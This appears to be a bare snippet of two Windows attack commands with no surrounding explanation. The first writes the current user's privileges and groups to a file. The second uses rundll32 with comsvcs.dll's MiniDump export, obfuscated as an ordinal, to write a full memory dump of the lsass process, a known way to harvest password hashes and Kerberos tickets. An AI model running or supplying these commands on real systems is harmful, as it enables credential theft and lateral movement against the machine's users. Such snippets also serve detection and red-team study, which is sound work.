whoami.exe /all > remittance.txt

powershell rundll32.exe C:\\Windows\\System32\\comsvcs.dll #+0000^24 (Get-Process lsass).Id dump.bin full
